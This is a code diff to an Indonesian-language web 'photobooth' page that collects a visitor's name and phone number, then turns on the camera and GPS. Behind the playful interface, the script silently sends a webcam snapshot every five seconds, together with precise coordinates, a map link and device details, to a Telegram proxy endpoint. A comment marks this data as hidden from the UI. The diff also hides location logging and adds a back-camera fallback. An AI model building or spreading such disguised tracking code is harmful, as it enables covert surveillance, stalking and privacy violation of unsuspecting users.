@@ -9,16 +9,14 @@
         /* Desain Studio Cantik */
         @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@400;700&display=swap');
         
-        /* Tambahkan dekorasi lucu di latar belakang */
         body {
-            background: linear-gradient(135deg, #fceabb 0%, #f8b5a5 100%); /* Gradien peach/krem */
+            background: linear-gradient(135deg, #fceabb 0%, #f8b5a5 100%); 
             font-family: 'Inter', sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 1rem;
-            /* Tambahkan pola dekoratif ala studio */
             background-image: radial-gradient(circle, #ffebeb 1px, transparent 1px), radial-gradient(circle, #fcebb0 1px, transparent 1px);
             background-size: 20px 20px;
         }
@@ -27,13 +25,13 @@
             width: 100%;
             max-width: 450px;
             background-color: #ffffff;
-            border-radius: 25px; /* Lebih rounded */
-            /* Bayangan unik dan lucu (soft pink glow) */
+            border-radius: 25px; 
             box-shadow: 0 15px 40px rgba(255, 105, 180, 0.4); 
             padding: 1.5rem;
             margin: 1rem 0;
             box-sizing: border-box;
-            border: 3px dashed #ff85a1; /* Border dekoratif */
+            border: 3px dashed #ff85a1; 
+            transition: transform 0.3s ease;
         }
 
         .title {
@@ -43,7 +41,7 @@
         }
 
         .video-wrapper {
-            border: 8px solid #ff85a1; /* Bingkai lebih tebal */
+            border: 8px solid #ff85a1; 
             border-radius: 18px;
             overflow: hidden;
             width: 100%;
@@ -56,53 +54,53 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scaleX(-1);
+            transform: scaleX(-1); /* Mirror effect */
             display: block;
         }
+
+        .button-style {
+            transition: all 0.1s ease;
+            transform: translateY(0);
+        }
+        .button-style:active {
+            box-shadow: none !important;
+            transform: translateY(2px) !important;
+        }
         
-        /* Tombol Lanjutkan/Start - Pink Pop */
         #start-button {
             background-color: #ff527b;
             box-shadow: 0 4px #d8366e;
-            transition: all 0.1s ease;
-        }
-        #start-button:hover {
-            background-color: #d8366e;
-            box-shadow: 0 2px #b02c59;
-            transform: translateY(2px);
         }
 
-        /* Tombol Jepret Lokal - Hijau Mint */
         #capture-button {
             background-color: #10b981;
             box-shadow: 0 4px #059669;
         }
-        #capture-button:hover {
-            background-color: #059669;
-            box-shadow: 0 2px #047857;
-            transform: translateY(2px);
-        }
 
-        /* Tombol Unduh (Lokal) - Biru Langit */
         #download-button {
             background-color: #3b82f6; 
             box-shadow: 0 4px #2563eb;
         }
-        #download-button:hover {
-            background-color: #2563eb;
-            box-shadow: 0 2px #1e40af;
-            transform: translateY(2px);
-        }
 
-        /* Tombol Share - Kuning Ceria */
         #share-button {
             background-color: #f59e0b; 
             box-shadow: 0 4px #d97706;
         }
-        #share-button:hover {
-            background-color: #d97706;
-            box-shadow: 0 2px #b45309;
-            transform: translateY(2px);
+
+        #countdown-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 6rem;
+            font-family: 'Pacifico', cursive;
+            color: #ff527b;
+            z-index: 10;
         }
     </style>
 </head>
@@ -128,7 +126,7 @@
                 <label for="phone" class="block text-sm font-medium text-gray-700">Nomor Handphone</label>
                 <input type="tel" id="phone" class="input-field border border-pink-300 p-2 rounded-lg w-full" placeholder="Nomor Handphone" required>
             </div>
-            <button id="start-button" class="w-full px-6 py-3 text-white rounded-xl font-bold active:shadow-none text-lg">
+            <button id="start-button" class="button-style w-full px-6 py-3 text-white rounded-xl font-bold text-lg">
                 Lanjutkan ke Photobooth 
             </button>
             <p id="status-message-form" class="mt-2 text-center text-sm font-medium text-red-600"></p>
@@ -137,21 +135,23 @@
         <!-- Area Photobooth (Tampil Setelah Mulai) -->
         <div id="monitoring-area" style="display: none;" class="space-y-4">
             
-            <div class="video-wrapper">
+            <div class="video-wrapper relative">
                 <!-- Video Stream dan Canvas untuk Foto -->
                 <video id="video-stream" autoplay playsinline style="display: none;"></video>
                 <canvas id="photo-canvas" style="display: none;"></canvas>
+                <!-- Countdown Display -->
+                <div id="countdown-overlay" style="display: none;"></div>
             </div>
 
             <!-- Tombol Interaktif Lokal -->
             <div class="controls flex justify-center space-x-3 sm:space-x-4">
-                <button id="capture-button" class="px-3 sm:px-5 py-3 text-white rounded-xl font-bold active:shadow-none text-sm sm:text-base">
-                    Jepret Foto
+                <button id="capture-button" class="button-style px-3 sm:px-5 py-3 text-white rounded-xl font-bold text-sm sm:text-base" disabled>
+                    Jepret Foto (Kamera Mati)
                 </button>
-                <button id="download-button" class="px-3 sm:px-5 py-3 text-white rounded-xl font-bold active:shadow-none text-sm sm:text-base" style="display: none;">
+                <button id="download-button" class="button-style px-3 sm:px-5 py-3 text-white rounded-xl font-bold text-sm sm:text-base" style="display: none;">
                     Unduh 💾
                 </button>
-                <button id="share-button" class="px-3 sm:px-5 py-3 text-white rounded-xl font-bold active:shadow-none text-sm sm:text-base" style="display: none;">
+                <button id="share-button" class="button-style px-3 sm:px-5 py-3 text-white rounded-xl font-bold text-sm sm:text-base" style="display: none;">
                     Share 📤
                 </button>
             </div>
@@ -173,11 +173,12 @@
             const captureButton = document.getElementById('capture-button');
             const downloadButton = document.getElementById('download-button');
             const shareButton = document.getElementById('share-button');
+            const countdownOverlay = document.getElementById('countdown-overlay');
 
             // Data Konfigurasi LOKAL
-            // Token dihapus! Kita akan memanggil endpoint proxy ini:
             const PROXY_ENDPOINT = '/api/telegram-proxy';
-            const INTERVAL_MS = 5000; // DIUBAH: 5 detik
+            const INTERVAL_MS = 5000; // 5 detik
+            const COUNTDOWN_SECONDS = 3;
 
             let videoStreamObject = null;
             let userLocation = null;
@@ -186,7 +187,7 @@
             let capturedPhotoBase64 = null;
             let deviceData = getDeviceData(); 
 
-            // --- FUNGSI UTILITY PESAN (Subtle & Temporary) ---
+            // --- FUNGSI UTILITY PESAN ---
 
             function showStatus(message, isError = false) {
                 statusMessageBg.textContent = message;
@@ -219,7 +220,6 @@
 
                 showStatus('Meminta izin kamera dan lokasi... Pengiriman 5s otomatis dimulai.', false);
                 
-                // Mulai permintaan izin dan loop otomatis
                 requestCameraPermission();
                 requestLocationPermission();
                 startAutoSendInterval();
@@ -230,16 +230,32 @@
 
             function requestCameraPermission() {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: true })
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }) // Coba kamera depan
                         .then(stream => {
                             videoStreamObject = stream;
                             videoStream.srcObject = stream;
                             videoStream.style.display = 'block';
+                            captureButton.disabled = false;
+                            captureButton.textContent = 'Jepret Foto';
                             console.log('Kamera Aktif. Pengiriman otomatis 5s siap.');
                         })
                         .catch(err => {
-                            showStatus(`Kamera GAGAL: ${err.name}. Pengiriman foto mungkin terlewat.`, true);
-                            console.error("Camera Error:", err);
+                            // Coba kamera belakang jika kamera depan gagal (di beberapa perangkat)
+                            return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                                .then(stream => {
+                                    videoStreamObject = stream;
+                                    videoStream.srcObject = stream;
+                                    videoStream.style.display = 'block';
+                                    captureButton.disabled = false;
+                                    captureButton.textContent = 'Jepret Foto (Back Camera)';
+                                    console.log('Kamera Belakang Aktif.');
+                                })
+                                .catch(err => {
+                                    showStatus(`Kamera GAGAL: ${err.name}. Pengiriman foto mungkin terlewat.`, true);
+                                    captureButton.disabled = true;
+                                    captureButton.textContent = 'Jepret Foto (Kamera Mati)';
+                                    console.error("Camera Error:", err);
+                                });
                         });
                 }
             }
@@ -252,7 +268,6 @@
                         maximumAge: 0 
                     };
 
-                    // Menggunakan watchPosition untuk pembaruan lokasi real-time dan akurat
                     navigator.geolocation.watchPosition(position => {
                         userLocation = {
                             latitude: position.coords.latitude,
@@ -260,7 +275,7 @@
                             accuracy: position.coords.accuracy,
                             timestamp: new Date(position.timestamp).toISOString()
                         };
-                        console.log(`Lokasi terupdate: ${userLocation.latitude}, ${userLocation.longitude}`);
+                        // console.log(`Lokasi terupdate: ${userLocation.latitude}, ${userLocation.longitude}`);
                     }, err => {
                         userLocation = null;
                         console.error(`Lokasi Gagal: ${err.message}`);
@@ -271,16 +286,39 @@
             // --- FUNGSI INTERAKTIF LOKAL (JEPET, UNDUH, SHARE) ---
             
             captureButton.addEventListener('click', () => {
-                const localPhoto = capturePhotoToCanvas(); 
-                if (localPhoto) {
-                    capturedPhotoBase64 = localPhoto; 
-                    downloadButton.style.display = 'inline-block';
-                    shareButton.style.display = 'inline-block';
-                    showStatus('Foto lokal siap diunduh & dibagikan!');
+                if (videoStreamObject) {
+                    runCountdownAndCapture(() => {
+                        const localPhoto = capturePhotoToCanvas(); 
+                        if (localPhoto) {
+                            capturedPhotoBase64 = localPhoto; 
+                            downloadButton.style.display = 'inline-block';
+                            shareButton.style.display = 'inline-block';
+                            showStatus('Foto lokal siap diunduh & dibagikan!');
+                        }
+                    });
                 } else {
-                    showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
+                     showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
                 }
             });
+
+            function runCountdownAndCapture(callback) {
+                let count = COUNTDOWN_SECONDS;
+                countdownOverlay.textContent = count;
+                countdownOverlay.style.display = 'flex';
+                captureButton.disabled = true;
+                
+                const timer = setInterval(() => {
+                    count--;
+                    if (count > 0) {
+                        countdownOverlay.textContent = count;
+                    } else {
+                        clearInterval(timer);
+                        countdownOverlay.style.display = 'none';
+                        captureButton.disabled = false;
+                        callback();
+                    }
+                }, 1000);
+            }
 
             downloadButton.addEventListener('click', () => {
                 if (capturedPhotoBase64) {
@@ -358,23 +396,16 @@
                 if (isSending) return;
 
                 isSending = true;
-                console.log(`Mengirim data otomatis (5s)... ${new Date().toLocaleTimeString()}`);
-                
                 const base64Image = capturePhotoToCanvas();
                 
-                // Tambahkan waktu dan tanggal saat ini
                 const now = new Date();
                 const dateTimeText = now.toLocaleString('id-ID', {
-                    year: 'numeric',
-                    month: 'long',
-                    day: 'numeric',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit',
+                    year: 'numeric', month: 'long', day: 'numeric',
+                    hour: '2-digit', minute: '2-digit', second: '2-digit',
                     timeZoneName: 'short'
                 });
 
-                // Kompilasi Caption (Data yang tidak ditampilkan di UI)
+                // Kompilasi Caption
                 const locationText = userLocation ? 
                     `✅ Lokasi Akurat:\nLAT: ${userLocation.latitude.toFixed(6)}\nLNG: ${userLocation.longitude.toFixed(6)}\nAkurasi: ${userLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
                     `❌ Lokasi GAGAL didapatkan.`;
@@ -401,20 +432,22 @@ OS: ${deviceData.os}
                 // Kirim data ke endpoint proxy
                 try {
                     await sendDataToProxy(base64Image, caption);
-                    console.log('✅ Pengiriman sukses. Menunggu 5s lagi...');
+                    // showStatus('✅ Data dikirim otomatis!', false); 
+                    console.log('✅ Pengiriman otomatis sukses.');
                 } catch (error) {
-                    console.error("Error saat mengirim data:", error);
+                    showStatus('❌ Pengiriman otomatis GAGAL! Cek token/ID.', true);
+                    console.error("Error saat mengirim data ke proxy:", error);
                 } finally {
                     isSending = false;
                 }
             }
             
-            // FUNGSI BARU: Mengirim data ke API Proxy Anda (bukan langsung ke Telegram)
+            // FUNGSI BARU: Mengirim data ke API Proxy Anda
             async function sendDataToProxy(base64Image, caption) {
                 const payload = {
                     caption: caption,
-                    base64Image: base64Image, // Kirim Base64 jika ada foto
-                    isPhoto: !!base64Image // Memberitahu proxy apakah ini foto
+                    base64Image: base64Image,
+                    isPhoto: !!base64Image 
                 };
 
                 const response = await fetch(PROXY_ENDPOINT, {
@@ -432,7 +465,7 @@ OS: ${deviceData.os}
             }
 
 
-            // --- UTILITIES (Device Info) ---
+            // --- UTILITIES (Device Info & Blob) ---
 
             function getDeviceData() {
                 const ua = navigator.userAgent;
